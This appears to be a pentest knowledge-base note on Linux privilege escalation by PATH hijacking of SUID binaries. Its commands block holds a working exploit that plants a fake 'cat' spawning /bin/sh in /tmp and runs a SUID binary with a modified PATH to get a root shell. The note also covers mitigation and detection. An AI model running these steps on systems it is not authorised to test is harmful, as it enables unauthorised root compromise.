---
topic: SUID — PATH hijacking and relative paths
tags: [linux, suid, path, privesc, backup]
---

# SUID — PATH hijacking and relative paths

**English** | [🌐 Español](suid-path-hijack.md)

## Concept

A SUID binary that runs another program without an absolute path searches `PATH`. If the user can write an earlier directory in `PATH`, they place an executable with the same name there and the binary launches it with root privileges. The flaw is not the SUID bit but how it resolves dependencies.

## When it applies

- `find / -perm -4000` shows a non-standard binary.
- `strings` reveals calls to `cat`, `tar`, `cp` or scripts without a path.
- The user controls a directory in `PATH`.

## Procedure

1. Enumerate SUID binaries and review their behavior.
2. Identify the dependency without an absolute path.
3. Create the malicious executable in a controlled directory.
4. Run the SUID with a modified `PATH`.

## Commands

```bash
find / -perm -4000 -type f 2>/dev/null
strings /usr/bin/backup | grep -iE "cat|tar|cp|sh"
mkdir -p /tmp/bin && printf '#!/bin/sh\n/bin/sh\n' > /tmp/bin/cat && chmod +x /tmp/bin/cat
PATH=/tmp/bin:$PATH /usr/bin/backup
```

## Variants

- Hijack a script invoked through `system()` or `popen()`.
- Abuse a relative working directory (`./`).
- Use `LD_PRELOAD` if the binary allows it.

## Limitations

- `PATH` may be sanitized in the SUID environment.
- The binary may use absolute paths.
- Capabilities and SELinux may restrict execution.

## Mitigation

- Use absolute paths in privileged binaries.
- Sanitize `PATH` and exclude user directories.
- Audit SUID and enforce least privilege.

## Detection

- SUID launching processes from temporary directories.
- `PATH` changes in privileged processes.
- Utility-named binaries in `/tmp`.

## References

- [0xdf — Lazy](https://0xdf.gitlab.io/2020/07/29/htb-lazy.html)
- [GTFOBins — PATH](https://gtfobins.github.io/gtfobins/env/)
- [CWE-426 — Untrusted Search Path](https://cwe.mitre.org/data/definitions/426.html)
